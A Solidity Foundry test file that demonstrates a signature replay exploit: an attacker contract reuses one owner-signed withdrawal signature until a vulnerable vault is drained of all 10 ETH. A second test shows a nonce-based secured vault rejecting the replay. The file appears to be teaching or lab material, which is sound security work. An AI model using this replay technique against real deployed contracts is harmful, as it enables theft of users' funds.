// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import "../vulnerable.sol";
import "../Exploit.sol";
import "../fixed.sol";

contract SignatureReplayTest is Test {
    VulnerableVault public vulnerableVault;
    SecuredVault public securedVault;
    Attacker public attackerContract;

    uint256 internal ownerPrivateKey;
    address internal owner;
    address internal recipient = makeAddr("recipient");
    address internal attacker = makeAddr("attacker");

    function setUp() public {
        ownerPrivateKey = 0xA11CE;
        owner = vm.addr(ownerPrivateKey);
        vm.deal(owner, 20 ether);

        vm.startPrank(owner);
        vulnerableVault = new VulnerableVault{value: 10 ether}();
        securedVault = new SecuredVault{value: 10 ether}();
        vm.stopPrank();

        attackerContract = new Attacker(address(vulnerableVault));
    }

    function test_signatureReplayExploit() public {
        uint256 transferAmount = 1 ether;

        // 1. Owner signs a message authorizing 1 ETH withdrawal for attackerContract
        bytes32 messageHash = vulnerableVault.getMessageHash(address(attackerContract), transferAmount);
        bytes32 ethSignedMessageHash = vulnerableVault.getEthSignedMessageHash(messageHash);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPrivateKey, ethSignedMessageHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        uint256 vaultBalanceBefore = vulnerableVault.getBalance();
        assertEq(vaultBalanceBefore, 10 ether);

        // 2. Attacker captures the signature and replays it repeatedly until the vault is empty
        vm.startPrank(attacker);
        attackerContract.attack(address(attackerContract), transferAmount, signature);
        vm.stopPrank();

        uint256 vaultBalanceAfter = vulnerableVault.getBalance();
        uint256 attackerBalance = address(attackerContract).balance;

        console.log("Vault balance after attack:", vaultBalanceAfter);
        console.log("Attacker balance after attack:", attackerBalance);

        // Entire vault drained due to replaying the same signature!
        assertEq(vaultBalanceAfter, 0);
        assertEq(attackerBalance, 10 ether);
    }

    function test_securedVaultPreventsReplay() public {
        uint256 transferAmount = 1 ether;
        uint256 nonce = securedVault.nonces(recipient);

        // 1. Owner signs a message for secured vault with nonce, contract address, and chainid
        bytes32 messageHash = securedVault.getMessageHash(recipient, transferAmount, nonce);
        bytes32 ethSignedMessageHash = securedVault.getEthSignedMessageHash(messageHash);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPrivateKey, ethSignedMessageHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        // 2. First call succeeds
        securedVault.withdrawWithSignature(recipient, transferAmount, nonce, signature);
        assertEq(recipient.balance, 1 ether);

        // 3. Replay attempt with same signature & nonce fails
        vm.expectRevert("Invalid nonce");
        securedVault.withdrawWithSignature(recipient, transferAmount, nonce, signature);
    }
}
